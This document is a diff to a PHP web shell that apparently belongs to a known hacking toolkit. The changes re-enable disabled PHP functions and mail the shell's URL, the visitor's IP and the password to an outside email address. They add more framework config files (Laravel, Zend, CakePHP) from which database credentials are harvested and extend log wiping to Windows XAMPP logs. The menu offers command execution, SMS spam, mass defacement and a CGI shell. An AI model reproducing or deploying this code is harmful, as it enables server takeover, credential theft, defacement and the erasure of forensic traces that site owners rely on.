@@ -26,6 +26,12 @@ set_time_limit(0);
 ini_set('max_execution_time', 0);
 ini_set('memory_limit', '999999999M');
 ini_restore('safe_mode');
+ini_restore("safe_mode_include_dir");
+ini_restore("safe_mode_exec_dir");
+ini_restore("disable_functions");
+ini_restore("allow_url_fopen");
+ignore_user_abort(0);
+ini_set('zlib.output_compression', 'Off');
 
 $auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
 $email = "gedzsarjuncomuniti@gmail.com"; // Your Email
@@ -82,11 +88,13 @@ error was encountered while trying to use an ErrorDocument to handle the request
 <?php
 	exit();
 }
-if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
+if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
-		$_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ] = true;
+		$_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ] = true;
 		$shell_path = $content_mail = "URL : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : " . $auth_pass . "\n\nBy Cvar1984";
-		@mail($email, "Logs", $content_mail, "From:Cvar1984");
+		if(!empty($email)) {
+			@mail($email, "Logs", $content_mail, "From:Cvar1984");
+		}
 	}
 	else {
 		login_shell();
@@ -191,24 +199,19 @@ if (!isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST'])) ])) {
 		height: 100vh;
 		position: relative;"
 	}
+	span {
+		color:red;
+	}
 	</style>
 </head>
 <body>
 <?php
 // FUNCTION
-function post_data($url, $data) {
+function post_data($url, $data)
+{
 	$ch = curl_init($url);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	return curl_exec($ch);
-	curl_close($ch);
-}
-
-function get_data($url, $data) {
-	$ch = curl_init($url . "?$data");
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 	return curl_exec($ch);
@@ -353,13 +356,18 @@ function config() {
 							"$user_config_dir/wp-config.php" => "WordPress",
 							"$user_config_dir/admin/config.php" => "OpenCart",
 							"$user_config_dir/slconfig.php" => "Sitelok",
-							"$user_config_dir/application/config/database.php" => "Ellislab"
+							"$user_config_dir/application/config/database.php" => "Ellislab",
+							"$user_config_dir/models/db-settings.php" => "Usercake",
+							"$user_config_dir/config/database.php" => "Laravel",
+							"$user_config_dir/application/config.ini" => "Zend",
+							"$user_config_dir/config/app.php" => "CakePHP"
 						);
 						foreach ($grab_config as $config => $nama_config) {
 							$ambil_config = @file_get_contents($config);
 							if (!empty($ambil_config)) {
 								$file_config = fopen(".config/config/$user_idx-$nama_config.txt", "w");
 								fputs($file_config, $ambil_config);
+								fclose($file_config);
 							}
 						}
 					}
@@ -385,10 +393,8 @@ function info() {
 ?>
    <center>
    	<h5><?php echo php_uname();?></h5>
-   	<h5>Disabled Function : <?php echo $dist; ?> </h5>
-		<textarea class="form-control" id="textarea" readonly /><?php
-	var_dump($_SERVER);
-?></textarea>
+   	<h5>Disabled Function : <?php echo $dist;?> </h5>
+		<textarea class="form-control" id="textarea" readonly /><?php var_dump($_SERVER);?></textarea>
 	</center>
 	<?php
 	die();
@@ -790,12 +796,15 @@ function clear_logs() {
 		@hapus('/var/log/wtmp');
 		@hapus('.config');
 		@hapus('error_log');
-		alert("Logs is clear");
 	}
 	else {
-		alert("This function not available for Windows server");
+		foreach(range('A','Z') as $drive) {
+			@hapus($drive.':\xampp\apache\logs\error.log');
+			@hapus($drive.':\xampp\apache\logs\access.log');
+		}
 		@hapus('.config');
 	}
+	alert("Logs is clear");
 }
 
 function cgi_shell() {
@@ -951,17 +960,7 @@ function newfile($file)
 		alert("Permission Denied Or File Exists");
 	}
 }
-function adminer()
-{
-	if(!file_exists('.config')) {
-	mkdir('.config');
-	}
-	if(!file_exists('.config/adminer.php')) {
-		file_put_contents('.config/adminer.php', file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php'));
-	}
-	echo "<iframe src='.config/adminer.php' class='iframe' frameborder='0' scrolling='no'></iframe>";
-	die();
-}
+
 // END FUNCTION
 
 ?>
@@ -974,22 +973,21 @@ function adminer()
 			<li class="active"><a href="?">Home</a></li>
 			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
 				<ul class="dropdown-menu">
-					<li><a href='?do=cmd'>Command Prompt</a></li>
-					<li><a href='?do=sms'>Spam SMS</a></li>
-					<li><a href='?do=music'>Music</a></li>
-					<li><a href='?do=jumping'>Jumping</a></li>
-					<li><a href='?do=config'>Config</a></li>
-					<li><a href='?do=mass_deface'>Mass Deface</a></li>
-					<li><a href='?do=info'>Server Info</a></li>
-					<li><a href='?do=logs'>Clear Logs</a></li>
-					<li><a href='?do=cgi'>CGI Shell</a></li>
-					<li><a href='?do=deface'>Auto Deface</a></li>
-					<li><a href='?do=shortlink'>Shortlink Generator</a></li>
-					<li><a href='?do=adminer'>Adminer</a></li>
+					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Prompt</a></li>
+					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
+					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
+					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
+					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
+					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
+					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
+					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
+					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
+					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
+					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
+					<li><a href='?'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
 				</ul>
 			</li>
-			<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span>
-						Logout</a></li>
+			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
 		</ul>
 	</div>
 </nav>
@@ -1064,9 +1062,7 @@ if(isset($_GET['do'])):
 	elseif($_GET['do'] == 'touch' and isset($_GET['files'])) {
 		newfile($_GET['files']);
 	}
-	elseif ($_GET['do'] == 'adminer') {
-		adminer();
-	}
+
 endif;
 $dir = scandir(getcwd());
 echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
@@ -1080,8 +1076,7 @@ foreach ($dir as $dir):
 	<?php
 	$ext = pathinfo($dir, PATHINFO_EXTENSION);
 	if (is_dir($dir)) {
-		echo "
-		<td><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' class='icon'>";
+		echo "<td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'>";
 		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
 		<a class='btn btn-success btn-xs' href='?do=touch&files=" . getcwd() . $sep . dirname($dir) . "'>New File</a>
@@ -1091,7 +1086,7 @@ foreach ($dir as $dir):
 		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif' or $ext == 'rar' or $ext == 'zip' or $ext == 'doc' or $ext == 'pdf') {
-		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
+		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
 		<a class='btn btn-success btn-xs' href='?do=touch&files=" . getcwd() . $sep . dirname($dir) . "'>New File</a>
@@ -1101,7 +1096,7 @@ foreach ($dir as $dir):
 		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	else {
-		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
+		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
 		<a class='btn btn-success btn-xs' href='?do=touch&files=" . getcwd() . $sep . dirname($dir) . "'>New File</a>
